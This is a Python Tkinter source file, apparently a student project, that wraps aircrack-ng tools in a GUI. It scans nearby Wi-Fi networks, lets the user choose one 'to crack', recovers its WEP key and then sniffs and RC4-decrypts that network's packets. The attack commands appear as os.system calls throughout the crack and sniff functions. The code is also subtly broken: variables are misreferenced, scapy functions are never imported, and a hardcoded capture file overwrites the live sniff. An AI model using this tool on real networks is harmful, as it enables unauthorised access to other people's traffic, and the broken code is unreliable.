from Tkinter import *
import os
import sys
import time
from RC4 import *


class UI:
	def __init__(self):
		self.master = Tk()
		self.master.title("Sniffer ESAT4B1")

	def start(self):
		start_screen = Canvas(self.master)
		start_screen.pack()
		text = Label(start_screen, text="Wifi sniffer\n4B1",font=("Courier", 44))
		start = Button(start_screen,text = "Start",width = 20,height = 2,font = ("Courier",20),
	                       command=lambda: [self.wifi_selection(),start_screen.destroy()])
		text.pack()
		start.pack()

	def wifi_selection(self):
		#setup
		
		os.system('sudo aireplay-ng --test wlan1')
		os.system('sudo airmon-ng check kill')
		
		#display al wifi nearby
		
		os.system("sudo iwlist wlan0 scan>output.txt")
		
		wifi_list = open('/home/xander/Desktop/output.txt','r').read()
		wifi_names = []
		while "ESSID" in wifi_list:
			place = wifi_list.index("ESSID")
			length = wifi_list[place+7:].index('"')
			name = wifi_list[place+7:place+length+7]
			wifi_list = wifi_list[place+length+2:]
			if name not in wifi_names:
				wifi_names.append(name)

		names_screen = Canvas(self.master) 
		names_screen.pack()
		Label(names_screen,text = "Available wifi networks to crack",font=("Courier", 20)).pack()
		labels = dict()
		for wifi_name in wifi_names:
			labels[wifi_name] = Button(names_screen, text = wifi_name,font=("Courier", 15),
					command = lambda name = wifi_name :[names_screen.destroy(),self.crack_the_wifi(name)])
			labels[wifi_name].pack()
		Label(names_screen,text = "Choose the one you want to crack",font=("Courier",20)).pack()

	def crack_the_wifi(self,wifi_name):
		wifi_list = open('/home/xander/Desktop/output.txt','r').read()
		wifi_list = wifi_list[wifi_list.index(wifi_name)-250:]
		index = wifi_list.index('Address:')
		self.mac_address = wifi_list[index+len("Address: "):index+len("Address: ")+17]
		
		os.system("sudo airodump-ng -w /home/kali/iv -c 1 -bssid {} wlan1mon".format(mac_address))
		os.system("sudo aircrack-ng /home/kali/iv-01.cap>key_info.txt")
		string = open('key_info.txt','r').read()
		index = string.index('ASCII')
		self.key = str[index+len('ASCII: '):index+len('ASCII: ')+5]
		#self.key = "12345"
		key_screen = Canvas(self.master)
		key_screen.pack()
		Label(key_screen,text = "Key has been found!\nkey:{}".format(self.key),font = ("Courier",30)).pack()
		Button(key_screen,text = "Start sniffing", width = 20,height = 2,font = ("Courier",20),
				command = lambda:[key_screen.destroy(),self.sniffing()]).pack()

	def sniffing(self):
		self.sniffing_screen = Canvas(self.master)
		self.sniffing_screen.pack()
		Label(self.sniffing_screen,text = "Packet sniffer",font = ("Courier",30)).pack()
		Label(self.sniffing_screen,text = "How many packets do you want to sniff?",font = ("Courier",20)).pack()
		self.amount = Entry(self.sniffing_screen)
		self.amount.pack()
		Button(self.sniffing_screen,text = "Start sniffing",font = ("Courier",20),command = lambda:[self.get()]).pack()
		
	   
	def get(self):
		amount = self.amount.get()
		if not amount.isdigit():
			error = Toplevel()
			error.wm_title("ERROR")
			text = Label(error, text="Amount of packets needs to be an integer")
			text.grid(column=0, row=0)
			ok = Button(error, text="Okay", command=error.destroy)
			ok.grid(row=1, column=0)
			return
		else:
			self.sniffing_screen.destroy()
			self.packet_reading(amount)

	def packet_reading(self,amount):
		packet_screen = Canvas(self.master)
		packet_screen.pack()
		
		packetdata = sniff(iface='wlan1mon',filter = 'ether host {}'.format(self.mac_address),
				lfilter=lambda x:x.haslayer('Dot11WEP'),count = amount)
		
		packetdata = rdpcap('/home/xander/Desktop/bestandje-02.cap')
		filtered_messages = list()
		for packet in packetdata:
			if packet.haslayer('Dot11WEP'):
				iv = bytes_hex(packet.iv).decode('utf-8')
				wepdata = bytes_hex(packet.wepdata).decode('utf-8')
				
				iv = ' '.join(iv[i:i+2] for i in range(0,len(iv),2))
				wepdata = ' '.join(wepdata[i:i+2] for i in range(0,len(wepdata),2))
				decrypted_message = decryption(self.key,wepdata,iv)
				filtered_messages.append(self.filter(decrypted_message))

		filtered_messages = set(filtered_messages)
		Label(packet_screen,text = "Sniffed packages",font = ("Courier", 20)).pack()
		Label(packet_screen,text = "Packages that have the same info or no info at all are filtered out",
								font = ("Courier", 15)).pack()
		i = 0
		for elem in filtered_messages:
			Label(packet_screen,text = "Packet {} : ".format(i) + elem).pack()
			i+=1


	def filter(self,message):
		filtered_message = ""
		for elem in message:
			if elem == " ":
				filtered_message += " "
			if elem.isalpha() or elem.isdigit():
				filtered_message += elem
			else:
				continue
		return filtered_message





B = UI()
B.start()
mainloop()

